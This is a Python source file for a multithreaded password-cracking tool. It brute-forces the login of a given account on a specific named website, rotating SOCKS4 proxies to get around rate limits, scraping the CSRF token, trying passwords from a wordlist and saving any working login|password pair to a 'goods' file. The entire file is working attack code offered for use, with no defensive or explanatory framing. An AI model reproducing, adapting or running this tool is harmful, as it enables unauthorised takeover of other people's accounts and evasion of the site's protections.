from requests import session
import re
import os
from ThreadStatic import ThreadStatic


class Cracker:
    def __init__(self, proxylist, login, passwords, passwordsids, threadname):
        self.threadname = threadname
        self.proxylist = proxylist
        self.login = login
        self.passwords = passwords
        self.passwordsids = passwordsids
        self.counter = 0
        self.proxy = None
        self.session_get()

    def session_get(self):
        if ThreadStatic.Done is True:
            return

        r = session()
        if len(self.proxylist) is 0:
            print('\n\n# {}: I have spent all proxies. Please update them.'.format(self.threadname))
            return
        self.proxy = self.proxylist.pop()

        try:
            r.proxies = {'https': 'socks4://' + self.proxy}
            data = r.get('https://shadowservants.ru/login', timeout=2).text
            reg = re.findall(r'<meta name=\"csrf_token\" content=\"[A-Za-z0-9.-]+\" />', data)
            if len(str(reg)) < 3:
                if ThreadStatic.Done is True:
                    return
                print('Looks like bad proxy: {} I\'ll repair it.'.format(self.proxy))
                self.session_get()
            csrf = str(reg).split()[2]
            csrf = csrf.split('"')
            csrf = csrf[1].replace('"', '')
            self.auth(r, csrf)
        except:
            if ThreadStatic.Done is True:
                return
            print('Looks like bad proxy: {} I\'ll repair it.'.format(self.proxy))
            self.session_get()

    def auth(self, r, csrf):
        if ThreadStatic.Done is True:
            return

        f = open(self.passwords, 'r', encoding='utf-8')
        password = f.readline()
        while password:
            while True:
                if len(self.passwordsids) < 1 or password is None:
                    return
                if self.passwordsids[0] != self.counter:
                    self.counter += 1
                    password = f.readline()
                else:
                    del (self.passwordsids[0])
                    break
                if len(password) <= 1:
                    return
            password = password.strip()
            password = password.replace('\\n', '')
            try:
                repl = r.post(url='https://shadowservants.ru/login',
                              data={'login': self.login, 'password': password, 'csrf_token': csrf},
                              headers={"referer": "https://shadowservants.ru/login"}, timeout=5)
                if "Too Many Requests" in repl.text:
                    self.session_get()
                    return
                if "Неправильный логин или пароль" not in repl.text and "Пользователь неактивен" not in repl.text:
                    try:
                        os.mkdir('./workout/')
                    except:
                        pass
                    try:
                        f = open('./workout/goods.txt', 'a', encoding='utf-8')
                        f.write('Good: ' + self.login + "|" + password + '\n')
                        f.close()
                    except:
                        print('\nCan\'t save results. Ok, I just say it here.\n')
                    print("\n\nNicely done! Password for \"{}\" is \"{}\"".format(self.login, password))
                    print(repl.text)
                    print('Shutting down threads ...')
                    raise KeyboardInterrupt
                else:
                    if ThreadStatic.Done is True:
                        return
                    print('Bad attempt with the "{}" password.'.format(password))
                password = f.readline()
                self.counter += 1
            except KeyboardInterrupt:
                f.close()
                ThreadStatic.Done = True
                return
            except:
                if ThreadStatic.Done is True:
                    return
                print('Looks like bad proxy: {} I\'ll repair it.'.format(self.proxy))
                f.close()
                self.session_get()

        f.close()
